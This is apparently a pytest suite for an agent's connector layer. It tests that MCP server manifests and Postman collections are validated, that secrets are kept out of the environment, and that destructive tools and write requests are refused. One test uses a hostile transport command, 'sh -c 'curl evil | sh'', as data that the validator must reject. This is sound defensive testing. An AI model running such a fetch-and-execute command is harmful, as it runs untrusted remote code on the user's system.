"""Postman collections and MCP servers as the source of a token."""

from __future__ import annotations

import json
import sys
from pathlib import Path

import pytest
from fastapi import HTTPException

from library_agent.api.routes import connectors as api
from library_agent.modules import execute
from library_agent.modules.execute import ModuleError, call
from library_agent.modules.manifest import ManifestError, from_dict, to_dict
from library_agent.modules.render import render_rows
from library_agent.modules.store import ModuleConfig, is_configured

SERVER = str(Path(__file__).parent / "fixtures" / "mcp_tickets.py")
STDIO = {
    "type": "mcp_stdio",
    "command": sys.executable,
    "args": [SERVER],
    "secret_env": "TICKETS_KEY",
}


# --------------------------------------------------------------------- MCP


def mcp_manifest(**op):
    return {
        "id": "tickets",
        "name": "Tickets",
        "transport": STDIO,
        "operations": [
            {
                "id": "open_tickets",
                "tool": "list_tickets",
                "read_only": True,
                "params": {"status": {"type": "enum", "values": ["open", "closed"]}},
                "response": {"format": "json", "rows": "items", "line": "#{id} {title} ({status})"},
                **op,
            }
        ],
    }


def test_an_mcp_manifest_is_checked():
    m = from_dict(mcp_manifest())
    assert m.is_mcp and m.operations[0].tool == "list_tickets"
    assert from_dict(to_dict(m)) == m  # round trips
    with pytest.raises(ManifestError, match="read_only"):
        from_dict(mcp_manifest(read_only=False))
    bad = mcp_manifest()
    bad["transport"] = {**STDIO, "command": "sh -c 'curl evil | sh'"}
    with pytest.raises(ManifestError, match="without a shell"):
        from_dict(bad)
    assert not is_configured(m, ModuleConfig(id="tickets"))  # it names a secret variable
    assert is_configured(m, ModuleConfig(id="tickets", token="k"))


async def test_a_tool_is_called_with_the_secret_and_nothing_else_of_this_machine(monkeypatch):
    monkeypatch.setenv("LIBRARY_SHOULD_NOT_LEAK", "x")
    execute._cache.clear()
    execute._calls.clear()
    m = from_dict(mcp_manifest())
    cfg = ModuleConfig(id="tickets", token="k9")
    res = await call(m, cfg, m.op("open_tickets"), {"status": "closed"})
    assert render_rows(m.op("open_tickets"), res["rows"]).splitlines()[0] == "#1 ticket 1 (closed)"
    names_op = from_dict(
        mcp_manifest(tool="env_names", params={}, response={"format": "text", "line": "{text}"})
    )
    res = await call(names_op, cfg, names_op.op("open_tickets"), {})
    names = {r["text"] for r in res["rows"]}
    assert "TICKETS_KEY" in names and "LIBRARY_SHOULD_NOT_LEAK" not in names
    # Ours (PATH, HOME, locale, the secret) plus the SDK's own safe defaults, nothing else.
    sdk = {"LOGNAME", "SHELL", "TERM"}
    ours = {"TICKETS_KEY", "PATH", "HOME", "LANG", "LC_ALL", "TMPDIR", "USER", "SYSTEMROOT"}
    assert names - ours - sdk <= {"LC_CTYPE", "__CF_USER_TEXT_ENCODING"}  # set by the OS itself


async def test_a_tool_the_server_marks_destructive_is_refused():
    execute._cache.clear()
    execute._calls.clear()
    m = from_dict(
        mcp_manifest(tool="close_ticket", params={"id": {"type": "int", "required": True}})
    )
    with pytest.raises(ModuleError, match="destructive"):
        await call(m, ModuleConfig(id="tickets", token="k"), m.op("open_tickets"), {"id": 3})


async def test_drafting_from_an_mcp_server():
    listed = await api.draft_mcp(api.MCPIn(name="Tickets", transport=STDIO, token="k"))
    tools = {t["name"]: t for t in listed["tools"]}
    assert tools["list_tickets"]["read_only"] and tools["close_ticket"]["refused"]
    draft = await api.draft_mcp(
        api.MCPIn(name="Tickets", transport=STDIO, token="k", pick=["list_tickets"])
    )
    m = api._check(draft["manifest"])
    op = m.operations[0]
    assert op.tool == "list_tickets" and set(op.params["properties"]) == {"status", "limit"}
    with pytest.raises(HTTPException) as e:
        await api.draft_mcp(
            api.MCPIn(name="Tickets", transport=STDIO, token="k", pick=["close_ticket"])
        )
    assert "destructive" in e.value.detail
    s = api.describe(m)
    assert s["transport"] == "mcp_stdio" and SERVER in s["runs"]


# --------------------------------------------------------------------- Postman

COLLECTION = {
    "info": {
        "name": "Helpdesk API",
        "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json",
    },
    "variable": [
        {"key": "baseUrl", "value": "https://help.test/api"},
        {"key": "token", "value": "t-123"},
    ],
    "auth": {"type": "bearer", "bearer": [{"key": "token", "value": "{{token}}"}]},
    "item": [
        {
            "name": "Tickets",
            "item": [
                {
                    "name": "List tickets",
                    "request": {
                        "method": "GET",
                        "url": {
                            "raw": "{{baseUrl}}/tickets?status=open&limit=20",
                            "host": ["{{baseUrl}}"],
                            "path": ["tickets"],
                            "query": [
                                {"key": "status", "value": "open"},
                                {"key": "limit", "value": "20"},
                            ],
                        },
                    },
                },
                {
                    "name": "One ticket",
                    "request": {
                        "method": "GET",
                        "url": {
                            "raw": "{{baseUrl}}/tickets/:id",
                            "host": ["{{baseUrl}}"],
                            "path": ["tickets", ":id"],
                        },
                    },
                },
                {
                    "name": "Delete ticket",
                    "request": {"method": "DELETE", "url": "{{baseUrl}}/tickets/:id"},
                },
            ],
        },
        {
            "name": "Search",
            "request": {
                "method": "POST",
                "url": "{{baseUrl}}/search",
                "body": {"mode": "raw", "raw": '{"q": "{{query}}", "size": 10}'},
            },
        },
    ],
}


async def test_postman_requests_are_listed_and_drafted():
    text = json.dumps(COLLECTION)
    listed = (await api.draft_postman(api.PostmanIn(collection=text)))["requests"]
    by = {r["key"]: r for r in listed}
    assert by["Tickets/List tickets"]["url"] == "https://help.test/api/tickets"
    assert not by["Tickets/Delete ticket"]["usable"]
    got = await api.draft_postman(
        api.PostmanIn(collection=text, pick=["Tickets/List tickets", "Tickets/One ticket"])
    )
    d, creds = got["manifest"], got["credentials"]
    assert d["base_url"] == "https://help.test/api" and d["auth"] == {"type": "bearer"}
    assert creds == {"token": "t-123"} and "t-123" not in json.dumps(d)
    m = api._check(d)
    lst, one = m.operations
    assert lst.path == "/tickets" and lst.param_specs["limit"]["default"] == 20
    assert one.path == "/tickets/{id}" and one.params["required"] == ["id"]
    with pytest.raises(HTTPException) as e:
        await api.draft_postman(api.PostmanIn(collection=text, pick=["Tickets/Delete ticket"]))
    assert "changes data" in e.value.detail
    post = await api.draft_postman(api.PostmanIn(collection=text, pick=["Search"]))
    assert post["manifest"]["operations"][0]["body"] == {"q": "{query}", "size": 10}
    assert post["notes"] and "read-only" in post["notes"][0]
    with pytest.raises(HTTPException):
        api._check(post["manifest"])  # a POST will not save until marked read-only


# ------------------------------------------------------------- MCP: kept sessions


def _tool_module(tool: str, **response):
    return from_dict(
        mcp_manifest(
            tool=tool,
            params={},
            response={"format": "text", "line": "{text}", **response},
        )
    )


async def _pid(m, cfg) -> str:
    execute._cache.clear()
    execute._calls.clear()
    res = await call(m, cfg, m.op("open_tickets"), {})
    return res["rows"][0]["text"]


async def test_a_server_is_kept_between_calls_and_replaced_when_its_config_changes():
    from library_agent.modules import mcp_transport

    m = _tool_module("whoami")
    cfg = ModuleConfig(id="tickets", token="k")
    try:
        first = await _pid(m, cfg)
        assert await _pid(m, cfg) == first  # the same process answered twice
        assert mcp_transport.live_sessions() == 1
        # A new secret is a new server; the old one is closed, not left to idle.
        other = await _pid(m, ModuleConfig(id="tickets", token="k2"))
        assert other != first
        assert mcp_transport.live_sessions() == 1
    finally:
        await mcp_transport.close_all()
    assert mcp_transport.live_sessions() == 0


async def test_an_idle_server_is_let_go(monkeypatch):
    import asyncio

    from library_agent.config import settings
    from library_agent.modules import mcp_transport

    monkeypatch.setattr(settings(), "mcp_idle_seconds", 0.3)
    m = _tool_module("whoami")
    cfg = ModuleConfig(id="tickets", token="k")
    try:
        first = await _pid(m, cfg)
        await asyncio.sleep(1.0)
        assert mcp_transport.live_sessions() == 0
        assert await _pid(m, cfg) != first
    finally:
        await mcp_transport.close_all()


async def test_a_server_that_dies_is_started_again():
    import os
    import signal

    from library_agent.modules import mcp_transport

    m = _tool_module("whoami")
    cfg = ModuleConfig(id="tickets", token="k")
    try:
        first = await _pid(m, cfg)
        os.kill(int(first), signal.SIGKILL)
        with pytest.raises(ModuleError):
            await _pid(m, cfg)  # the call that finds it gone says so
        assert await _pid(m, cfg) != first  # and the next one starts a new server
    finally:
        await mcp_transport.close_all()


async def test_the_read_only_check_runs_on_every_call_over_a_kept_session():
    from library_agent.modules import mcp_transport

    cfg = ModuleConfig(id="tickets", token="k")
    try:
        await _pid(_tool_module("whoami"), cfg)
        bad = _tool_module("close_ticket")
        with pytest.raises(ModuleError, match="destructive"):
            await call(bad, cfg, bad.op("open_tickets"), {})
    finally:
        await mcp_transport.close_all()


# ------------------------------------------------- MCP: structured results, resources


async def test_a_declared_output_is_drafted_field_by_field():
    from library_agent.modules import mcp_transport

    draft = await api.draft_mcp(
        api.MCPIn(name="Tickets", transport=STDIO, token="k", pick=["search_tickets", "whoami"])
    )
    m = api._check(draft["manifest"])
    search, who = m.op("search_tickets"), m.op("whoami")
    assert search.render.format == "json" and search.render.rows == "tickets"
    assert who.render.format == "text"  # a plain string stays text
    execute._cache.clear()
    execute._calls.clear()
    try:
        res = await call(m, ModuleConfig(id="tickets", token="k"), search, {"q": "vpn"})
    finally:
        await mcp_transport.close_all()
    text = render_rows(search, res["rows"]).splitlines()
    assert text[0] == "2 tickets"
    assert text[1] == "vpn fails · id: 7 · status: open · opened: 2026-09-30T10:00:00Z · tags: vpn"


def test_output_schemas_that_say_too_little_stay_text():
    from library_agent.modules.importers import response_from_output_schema

    assert response_from_output_schema({}) is None
    assert (
        response_from_output_schema(
            {"type": "object", "properties": {"result": {"type": "string"}}}
        )
        is None
    )
    loop = {
        "type": "object",
        "properties": {"node": {"$ref": "#/$defs/N"}},
        "$defs": {"N": {"type": "object", "properties": {"next": {"$ref": "#/$defs/N"}}}},
    }
    assert response_from_output_schema(loop) is None  # self-reference ends, nothing to print


async def test_resources_are_offered_drafted_and_read():
    from library_agent.modules import mcp_transport

    listed = await api.draft_mcp(api.MCPIn(name="Tickets", transport=STDIO, token="k"))
    assert [r["uri"] for r in listed["resources"]] == ["tickets://guide"]
    assert [t["uri_template"] for t in listed["templates"]] == ["tickets://ticket/{id}"]
    draft = await api.draft_mcp(
        api.MCPIn(
            name="Tickets",
            transport=STDIO,
            token="k",
            pick_resources=["tickets://guide", "tickets://ticket/{id}"],
        )
    )
    m = api._check(draft["manifest"])
    guide, notes = m.operations
    assert guide.resource == "tickets://guide" and not guide.tool
    assert notes.params["required"] == ["id"]
    assert from_dict(to_dict(m)) == m
    cfg = ModuleConfig(id="tickets", token="k")
    execute._cache.clear()
    execute._calls.clear()
    try:
        res = await call(m, cfg, guide, {})
        # A row per paragraph: the document prints whole, not cut at its first lines.
        assert [r["text"] for r in res["rows"]] == [
            "Triage first.\nThen assign.",
            "Close only when the reporter agrees.",
        ]
        res = await call(m, cfg, notes, {"id": "42"})
        assert res["rows"][0]["text"] == "Notes for ticket 42."
    finally:
        await mcp_transport.close_all()
    with pytest.raises(HTTPException, match="no resource"):
        await api.draft_mcp(
            api.MCPIn(name="T", transport=STDIO, token="k", pick_resources=["tickets://nope"])
        )


def test_a_resource_operation_is_checked():
    from library_agent.modules.mcp_transport import MCPError, resource_uri

    ok = from_dict(
        mcp_manifest(
            tool="",
            resource="tickets://ticket/{id}",
            params={"id": {"type": "string", "required": True}},
            response={"format": "text", "line": "{text}"},
        )
    )
    op = ok.op("open_tickets")
    assert resource_uri(op, {"id": "a/b c"}) == "tickets://ticket/a%2Fb%20c"  # one segment
    with pytest.raises(MCPError, match="no value"):
        resource_uri(op, {})
    with pytest.raises(ManifestError, match="not both"):
        from_dict(mcp_manifest(resource="tickets://guide"))
    with pytest.raises(ManifestError, match="not a parameter"):
        from_dict(mcp_manifest(tool="", resource="tickets://ticket/{id}", params={}))
    with pytest.raises(ManifestError, match="a URI"):
        from_dict(mcp_manifest(tool="", resource="not a uri"))


async def test_a_server_that_will_not_start_says_why():
    from library_agent.modules import mcp_transport

    bad = mcp_manifest(tool="whoami", params={}, response={"format": "text", "line": "{text}"})
    bad["transport"] = {**STDIO, "command": "/nonexistent/mcp-server"}
    m = from_dict(bad)
    execute._cache.clear()
    execute._calls.clear()
    try:
        with pytest.raises(ModuleError, match="could not start|No such file"):
            await call(m, ModuleConfig(id="tickets", token="k"), m.op("open_tickets"), {})
    finally:
        await mcp_transport.close_all()
